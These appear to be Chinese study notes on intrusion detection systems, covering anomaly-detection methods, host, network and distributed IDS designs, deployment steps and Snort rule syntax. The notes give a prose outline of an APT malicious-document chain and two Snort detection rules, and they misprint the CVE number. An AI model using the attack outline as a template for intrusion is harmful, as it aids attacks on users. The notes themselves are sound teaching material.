①能够好地处理变化多样的用户行为，并具有很强的时序模式；
②能够集中考虑少数几个相关的安全事件，而不是关注可疑的整个登录会话过程；
③容易发现针对检测系统的攻击。

#### 基于文本分类的异常检测方法
将程序的系统调用视为某个文档中的“字”，进程运行所产生的系统调用几个就产生一个“文档”。对于每个进程所产生的“文档”，利用K-Nearest Neighbor文本分类算法，分析文档的相似性。
##### KNN: 
KNN 可以通过分析新数据点与其邻居的距离来判断该数据点是否异常。基本思想如下：
- 训练阶段：
使用正常行为的样本数据（即没有入侵行为的正常文本或系统日志）来构建训练集。
- 检测阶段：
对于新到的样本数据（如新日志条目或新文本片段），计算它与训练集中所有正常样本的距离。
找到 k 个最近的邻居，并计算它们与新样本之间的平均距离或加权距离。
设置一个距离阈值，如果新样本与其邻居的平均距离超过了这个阈值，说明它与正常行为之间存在显著的差异，可能是异常行为。

缺点：计算量大。

#### 基于贝叶斯推理的异常检测方法
指在任意给定的时刻，测量 A1,A2,...,An 变量值，推理判断系统是否发生入侵行为。每个变量 Ai 表示系统某一方面的特征，例如磁盘 I/O 的活动数量、系统中页面出错的数目等。

公式P215

根据各种异常测量的值、入侵的先验概率、入侵发生时每种测量得到的异常概率，就能够判断系统入侵的概率。但是为了保证检测的准确性，还需要考虑各变量之间的独立性。一种方法是通过相关性分析，确定各异常变量与入侵的关系。

假定变量Ai取两个值：1 表示异常，0 表示正常。令I表示系统当前遭受的入侵攻击。每个异常变量Ai的异常可信性和敏感性分别用\( P(A_i \mid I) \) 和 \( P(A_i \mid \neg I) \)来表示。在给定每个Ai值的条件下，由贝叶斯定理得出可信度为：

\[
P(I \mid A_1, A_2, \cdots, A_n) = P(A_1, A_2, \cdots, A_n \mid I) \times \frac{P(I)}{P(A_1, A_2, \cdots, A_n)}
\]
\[
P(A_1, A_2, \cdots, A_n \mid I) = \prod_{i=1}^{n} P(A_i \mid I)
\]

\[
P(A_1, A_2, \cdots, A_n \mid \neg I) = \prod_{i=1}^{n} P(A_i \mid \neg I)
\]

得到：
\[
P(I \mid A_1, A_2, \cdots, A_n) = \frac{P(I)}{P(\neg I)} \times \frac{\prod_{i=1}^{n} P(A_i \mid I)}{\prod_{i=1}^{n} P(A_i \mid \neg I)}
\]


##### 步骤解析

1. 先验概率 \( P(I) \) 和 \( P(\neg I) \)：
   - 这些概率通常基于历史数据或专家经验给出，表示在没有其他信息时，系统被入侵或未被入侵的初始概率。

2. 条件概率 \( P(A_i \mid I) \) 和 \( P(A_i \mid \neg I) \)：
   - 这些概率表示在系统被入侵或未被入侵时，测量值 \( A_i \) 异常的概率。

3. 后验概率 \( P(I \mid A_1, A_2, \cdots, A_n) \)：
   - 通过将观测到的异常测量值代入公式，计算系统当前被入侵的概率。

根据各种异常测量的值、入侵的先验概率、入侵发生时每种测量得到的异常概率，就能够判断系统入侵的概率。但是为了保证检测的准确性，还需要考虑各变量之间的独立性。

### 其他
#### 基于规范的检测方法
specification-based intrusion detection
介于异常检测和误用检测之间
- 原理：用一种策略描述语言 PE-grammars 事先定义**系统特权程序**有关安全的**操作执行序列**，每个特权程序都有一组安全操作序列，这些操作序列构成特权程序的安全跟踪策略（trace policy）。
若特权程序的操作序列不符合已定义的操作序列，就进行入侵报警。

#### 基于生物免疫的检测方法
构造系统“自我”(self/non-self)标志以及标志演变方法

#### 基于攻击诱骗的检测方法
#### 基于入侵报警的关联检测方法
通过对原始的 IDS 报警事件的分类及相关性分析来发现复杂攻击行为。
- 第一类基于报警数据的相似性进行报警关联分析；
- 第二类通过人为设定参数或通过机器学习的方法进行报警关联分析；
- 第三类根据某种攻击的前提条件与结果（preconditions and consequences）进行报警关联分析。

#### 基于沙箱动态分析的检测方法
通过构建程序运行的受控安全环境，形成程序运行安全沙箱，然后监测可疑恶意文件或程序在安全沙箱的运行状况.

#### 基于大数据分析的检测方法

## 入侵检测系统组成与分类
### 入侵检测系统组成
一个入侵检测系统主要由以下功能模块组成：数据采集模块、入侵分析引警模块、应急处置模块、管理配置模块和相关的辅助模块。

- 数据采集模块：
为入侵分析引警模块提供分析用的数据，包括操作系统的审计日志、应用程序的运行日志和网络数据包等。
- 入侵分析引警模块：
根据辅助模块提供的信息（如攻击模式库），根据一定的算法对收集到的数据进行分析，判断判断是否有入侵行为出现，并产生入侵报警信息，这部分是入侵检测系统的核心模块。
- 管理配置模块：
为其他模块提供配置服务，是 IDS 系统的模块与用户的接口。
- 应急处置模块：
在发生入侵后，提供紧急响应服务，例如关闭网络服务、中断网络连接、启动备份系统等。
- 辅助模块的功能：
协助入侵分析引警模块工作，为它提供其他的辅助信息，例如攻击特征库、漏洞信息库等。

根据 IDS 的检测数据来源和它的安全作用范围，可以将 IDS 分为三类：
- 第一类是基于主机的入侵检测系统（简称 HIDS），即通过分析主机的信息去检测入侵行为；
- 第二类是基于网络的入侵检测系统（简称 NIDS），即通过获取网络通信中的数据包，对这些数据包进行攻击特征性扫描或异常流量检测来发现入侵行为；
- 第三类为分布式入侵检测系统（简称 DIDS），多人包含主机、多个网络采集检测数据，或者收集单个 IDS 的报警信息，根据收集到的信息进行综合分析，以发现入侵行为。

### 基于主机的入侵检测系统
主要通过收集主机系统的日志文件、系统调用以及应用程序的使用、系统资源、网络通信和用户使用等信息，分析这些信息是否包含攻击特征或异常情况。

实际的 HIDS 产品中，**CPU 利用率、内存利用率、磁盘空间大小、网络端口使用情况、注册表、文件的完整性、进程信息、系统调用**等行为是识别入侵事件的依据。

HIDS 一般适合检测以下入侵行为：

针对主机的端口或漏洞扫描；
重大失败的登录尝试；
远程入侵破解；
主机系统的用户账号添加；
服务启动或停止；
系统重启；
文件的完整性或许可权变化；
注册表修改；
重要系统启动文件变更；
程序的异常调用；
拒绝服务攻击。

常见软件工具：
- SWATCH: The Simple WATCHer and filer。用于实时监视日志的 PERL 程序。具有很有用的安装脚本，可以将所有的程序文件、手册页和 PERL 文件复制到相应目录下。
- Tripwire 是一个文件和目录完整性检测工具软件包，主要用于帮助管理员和用户监测文件的变化。它根据系统文件的规则设置，将已破坏或被篡改的文件通知系统管理员，因而常作为损害控制检测工具。
- 网页防篡改系统，防止网页文件被入侵者非法修改。监测网页文件生成完整性标记。发现破坏则启动备份系统恢复正常网页。

##### 优点
- 检测到网络层入侵检测系统（NIDS）无法检测到的针对主机的攻击，例如文件篡改、内核攻击、特权提升等。
- 可以运行在应用加密系统的网络上，（加密信息在到达被监控主机时/前解密）。
- 可运行在交换网络中。

##### 缺点
- 每个主机都安装和维护信息收集模块。
- HIDS的一部分安装在被攻击的主机上，HIDS可能受到攻击。
- 占用系统资源。
- 不能有效检测网络扫描。
- 不能有效检测DDos。（对网络流量的分析能力较弱）
- 只能使用监控主机的计算资源。

8.20
---
### 基于网络的入侵检测系统
Network-based Intrusion Detection System, NIDS
NIDS 通过侦听网络系统，捕获网络数据包，并依据网络包是否包含攻击特征，或者网络通信流是否异常来识别入侵行为。
NIDS 通常由一组用途单一的计算机组成，其构成分为两部分：**探测器**和**管理控制器**。
- 探测器分布在网络中的不同区域，通过监听（嗅探）方式获取网络包，探测器将检测到攻击行为形成报警事件，向管理控制器发送报警信息，报告发生入侵行为。
- 管理控制器可监控不同网络区域的探测器，接收来自探测器的报警信息。

一般来说，NIDS 能够检测到以下入侵行为：

- 同步洪暴（SYN Flood）；
- 分布式拒绝服务攻击（DDoS）；
- 网络扫描；
- 缓冲区溢出；
- 协议攻击；
- 流量异常；
- 非法网络访问。

Snort 是轻量型的 NIDS，它首先通过 libpcap 软件包监听（sniffer/logger）获得网络数据包，然后进行入侵检测分析。其主要方法是基于规则的审计分析，进行包的数据内容搜索/匹配。

##### 优点
- 可监控大型网络
- 被动型设备，对网络影响小
- 隐蔽强，避免被攻击
##### 缺点
- 在高速网络中难以处理所有数据包
- 交换机的网络分段问题：
交换机可以将网络分为许多小单元 VLAN，而大多数交换机不提供统一的监测端口，这就减少了基于网络的入侵检测系统的监测范围。
- 无法检测加密流量
- 仅依靠网络流量无法推知命令的执行结果

### 分布式入侵检测系统
Distributed Intrusion Detection System, DIDS
DIDS 通过在多个节点上分布式地部署检测和分析模块，协同监控和响应，来提升整体的入侵检测能力。

#### 特点
- 漏洞分散性
分布在网络中的各个主机或子网，可能被攻击者利用，分散的攻击无法被单一的IDS检测到。DIDS在多个点上进行检测。
- 入侵行为复杂
不再单一，而是互相协作的入侵行为。
- 数据收集
将大量数据(日志、警报)整合成全局视图
- 高速网络流量处理
网络流量大，集中处理会造成检测瓶颈，导致误报和漏报增多。在网络的不同节点上分布检测任务。

#### 基于主机检测的分布式入侵检测系统
DIDS结合HIDS => HDIDS
主机探测器多以安全代理（Agent）的形式直接安装在每个被保护的主机系统上，通过网络中的系统管理控制台进行远程控制。

#### 基于网络的分布式入侵检测系统
NDIDS（Network Distributed Intrusion Detection System）的结构分为两部分：**网络探测器**和**管理控制器**。
网络探测器部署在重要的网络区域，如服务器所在的网段，用于收集网络通信数据和业务数据流。
通过采用异常和误用两种方法对收集到的信息进行分析，若出现攻击或异常网络行为，就向管理控制器发送报警信息。

- HDIDS典型配置：主机探测器（Agent）安装在每个需要保护的主机上，负责监控主机的系统日志、文件完整性、系统调用等行为。所有的探测器都将数据传输到中央管理控制台，由管理控制台对收集的数据进行集中分析和处理。

- NDIDS功能模块分布式配置和管理结构，NIDS 探测器部署在网络的关键位置，如路由器、防火墙、DMZ 区域（非军事区）、DNS 服务器等。每个探测器负责监控其所在网络段的流量，并将检测结果发送到 NIDS 管理控制器。NIDS 管理控制器集中分析所有探测器收集的数据，并根据分析结果进行响应。

#### 优缺点
广泛覆盖，能够将基于主机和网络的系统结构结合起来，检测所有可能的数据来源主机。
综合监控，能够在多个网络节点上同事部署探测器。

缺点：复杂性增加。由于是分布式的结构，所以也带来了新的弱点。例如，传输安全事件过程中增加了通信的安全问题处理，安全管理配置复杂度增加等。

## 入侵检测系统主要产品与技术指标
### 入侵检测相关产品
#### 主机入侵检测系统 (HIDS)
主要通过监控主机上的活动信息及重要文件，采用特征匹配、系统文件监测、安全规则符合检查、文件数字指纹、大数据分析等技术手段来发现入侵行为。
- 举例：北信源主机监控审计系统、360 安全卫士、McAfee MVISION Endpoint Detection and Response (EDR) 等。

8.21
---
#### 网络入侵检测系统
绿盟科技IDS体系架构 P222
各模块之间SSL通信
 网络探测器模块中，TCPKiller 可以识别和定位恶意的 TCP 连接（如 TCP SYN Flood 攻击或其他类型的基于 TCP 的攻击），并通过发送 RST（Reset）包来强制关闭这些连接，从而迅速阻断攻击流量。

 #### 统一威胁管理
 UTM Unified Threat Management
 一种集成多种安全功能的设备或平台，它将防火墙、入侵检测和防御、VPN、反病毒、反垃圾邮件、内容过滤、流量控制等多种安全功能整合到一个硬件或软件设备中，形成网络安全的多层防护体系。

 通常部署在内部网络和外部网络的边界，部署方式通常包括 透明网桥、路由转发和NAT网关。

 #### 高级持续威胁检测
Advanced Persistent Threat，APT
一类复杂且持续性的网络攻击。
通常将恶意代码嵌入Word文档、Excel文档、PPT文档、PDF文档和电子邮件中。

CVE0-2017-8570
- 恶意文档（例如 Word 或 Excel 文件）：攻击者在文档中嵌入恶意代码，通过邮件或其他方式发送给目标用户。

- 文档执行恶意代码：用户打开文档后，嵌入的恶意代码被触发，下载并执行一个恶意的脚本文件（如图中的 JVGHBCYYKRAE2DU.sct）。

- 恶意程序安装：恶意脚本会下载并运行一个恶意程序（如 Setup.exe），这个程序通常会在后台执行恶意行为，如窃取数据、安装后门等。

- C&C 服务器通信：恶意程序会与攻击者控制的 C&C（命令与控制）服务器通信，发送窃取的数据并接收进一步的指令。

APT检测系统是入侵检测技术产品的特殊形态，其产品技术原理基于静态/动态分析检测可疑恶意电子文件及关联分析网安大数据，以发现apt活动。

#### 其他
根据入侵检测应用对象，常见的产品类型有 Web IDS、数据库 IDS、工控 IDS 等。
- Web IDS： 利用 Web 网络流量或 Web 访问日志等信息，检测常见的 Web 攻击，如 Webshell、SQL 注入、远程文件包含（RFI）、跨站点脚本（XSS）等攻击行为；
- 数据库 IDS 利用数据库网络通信流量或数据库访问日志等信息，对常见的数据库攻击行为进行检测，如数据库系统口令攻击、SQL 注入攻击、数据库漏洞利用攻击等；
- 工控 IDS 则通过获取工控设备、工控协议相关信息，根据工控漏洞攻击检测规则、异常报文特征和工控协议安全策略，检测工控系统的攻击行为。

### 入侵检测相关指标
#### 可靠性
容错能力，可连续运行
#### 可用性
系统运行开销小，不能影响主机和网络性能。
#### 可扩展性
易于配置修改和安装部署
#### 时效性
尽快分析报警数据
#### 准确性
正确检测出系统入侵活动的能力，低误报漏报
#### 安全性
IDS本身也存在安全漏洞，应保护自身安全功能。

## 入侵检测系统应用
### 应用场景类型
- 上网保护
- 网站入侵检测与保护
- 网络攻击阻断
- 主机/终端恶意代码检测
- 网络安全监测预警与应急处置
- 网络安全等级保护

### 入侵检测系统部署方法
##### 确定监测对象或保护网段
 组织或公司的安全策略要求；不同的网络段和对象可能面临不同的威胁。

##### 安装 IDS 探测器
探测器可以是基于硬件的设备，也可以是软件探针，通常部署在流量汇聚点，如核心交换机、路由器或防火墙后面，以便获取尽可能全面的流量信息。

##### 制订检测策略
针对监测对象或保护网段的安全需求。
检测策略应包括入侵检测的规则集（如已知的攻击特征、协议异常行为）。

##### 选择 IDS 结构类型
可以选择基于网络的 IDS（NIDS）或基于主机的 IDS（HIDS），也可以选择分布式 IDS（DIDS）

##### 配置入侵检测规则
配置内容包括匹配规则的优先级、报警方式、自动响应动作（如阻断连接、隔离主机）等。

##### 测试和验证 IDS 策略
通过模拟攻击测试（如渗透测试、红队演练），验证 IDS 是否能够正确检测和响应攻击行为，并调整策略以优化检测效果。

##### 运行和维护 IDS
包括定期更新检测规则、监控 IDS 的性能、分析检测日志、以及响应实际发生的安全事件。此外，还需定期进行系统性能调优和策略更新，以应对新的威胁。


823
---
### 基于HIDS的主机威胁检测
HIDS（Host-based Intrusion Detection System）
- 单机应用：在这种应用方式下，HIDS 系统直接安装在需要监控的主机上，通过本地监控该主机的各种活动，来检测和响应入侵行为。

- 分布式应用：在分布式应用中，HIDS 系统包括多个部分：多个主机探测器（Sensor）安装在不同的主机上，另外还有一个集中管理的控制器（管理中心）。管理中心与各个探测器进行通信，统一管理和监控多台主机的安全状态。

### 基于 NIDS 的内网威胁检测
探测器的部署：
位置选择：在内网的关键位置（如核心交换机、路由器或广播式 Hub）上连接 NIDS 的探测器。这个位置通常是**网络流量的汇聚点**，可以获取大量的网络数据包。
Probe 端口：探测器通常接入到交换机的探针端口（Probe），这个端口可以复制交换机上所有的数据流量，方便 NIDS 进行实时监控和分析。
数据采集与分析：

数据采集：探测器通过监听网络流量，实时收集通过其监控端口的所有数据包。这些数据包可能包含多种网络协议的通信信息，如 TCP/IP、HTTP、DNS 等。
流量分析：NIDS 系统根据预设的检测规则和行为模型，对采集到的网络流量进行分析。它可以识别出常见的攻击特征，如 DDoS 攻击、端口扫描、病毒传播等。
威胁检测与响应：

威胁检测：通过分析网络流量中的异常行为，NIDS 可以检测出内网中潜在的入侵行为。例如，频繁的连接请求可能表明存在端口扫描行为，异常大的流量可能是 DDoS 攻击的前兆。
报警与响应：一旦 NIDS 检测到威胁，它会立即向管理控制台发送报警信息。管理员可以根据这些报警信息，采取进一步的防护措施，如隔离受感染的主机、封锁可疑的 IP 地址等。

### 网络安全态势感知应用参考
Security Onion 
https://github.com/Security-Onion-Solutions/securityonion
一个典型的开源安全监控和态势感知平台，集成了多种安全工具和技术，能够提供入侵检测、日志管理和安全监控等功能。
集成 Elasticsearch、Logstash、Kibana、Snort、Suricata、Bro、Sguil、Squert、CyberChef、NetworkMiner等工具。

Elasticsearch、Logstash 和 Kibana（ELK Stack）：
Elasticsearch：一个分布式的搜索和分析引擎，负责存储和检索日志数据。👉提取、索引
Logstash：一个数据处理管道工具，负责收集、解析和传输日志数据到 Elasticsearch 中。👉解析
Kibana：一个数据可视化工具，提供对 Elasticsearch 数据的可视化查询和分析。👉查询/可视化

Snort/Suricata：
Snort 和 Suricata 是流行的网络入侵检测系统，负责实时监控网络流量，并识别和报警潜在的入侵行为。
功能：监控网络数据包，识别已知的攻击特征，并生成安全警报。

OSSEC：
OSSEC 是一个开源的主机入侵检测系统（HIDS），主要用于监控主机级别的安全事件，如文件完整性检查、日志分析和用户活动监控。
功能：检测主机上的异常行为，并发送警报以提示可能的入侵或安全问题。
Bro（现更名为 Zeek）：

Bro/Zeek 是一个强大的网络流量分析平台，专注于深入解析网络协议并记录流量日志，用于长期的安全监控和分析。
功能：记录详细的网络活动日志，如 HTTP 请求、DNS 查询等，帮助识别复杂的攻击行为。

Syslog：
Syslog 是一种标准的日志传输协议，用于收集和传输系统日志信息。
功能：整合来自各种网络设备和服务器的日志信息，便于集中管理和分析。
分析机与工具集：

分析机：通过集成的工具进行数据的查询、可视化、提取和索引。常用工具包括 domain_stats.py、freq_server.py 等，用于分析频率、域名统计等数据。
警告与管理：使用 ElastAlert 生成告警，Curator 进行索引和数据的管理。

### 开源网络入侵检测系统
常见的开源网络入侵检测系统（IDS）包括 Snort、Suricata、Bro/Zeek、OpenDLP、Sagan 等。

https://github.com/snort3/snort3
#### Snort 规则结构
Snort 的规则由两个部分组成：规则头 和 规则选项。

规则头 包含以下信息：

操作（action）：指定当检测到匹配条件时，Snort 应采取的动作，例如 alert（报警）、log（记录日志）、pass（忽略）等。
协议（protocol）：指定要监控的网络协议，如 tcp、udp、icmp 等。
源地址和目标地址（source and destination IP addresses）：指定源和目的 IP 地址，可以是具体的 IP，子网范围，或 any（任意地址）。
源端口和目标端口（source and destination ports）：指定源和目的端口号，也可以是具体端口号、范围，或 any。
规则选项 定义了更多的细节，如检测条件和报警消息等。规则选项由关键词和相应的参数组成，以括号括起来，并用分号隔开。常见的关键词包括：

msg：定义报警时显示的消息。
content：指定要在数据包中匹配的内容。

Snort规则示例：
`alert tcp any any -> 192.168.1.0/24 111 (content:"|00 01 86 a5|"; msg:"mountd access";)`
当检测到从任意源 IP（any）和端口（any）发送到目标子网 `192.168.1.0/24` 的 TCP 数据包，并且数据包内容包含特定的十六进制字符串 `00 01 86 a5` 时，触发报警，并显示消息 "mountd access"。

#### Nmap扫描检测规则
`alert icmp any any -> 192.168.X.Y any (msg: "NMAP ping sweep Scan"; dsize:0; sid:10000004; rev:1;)`

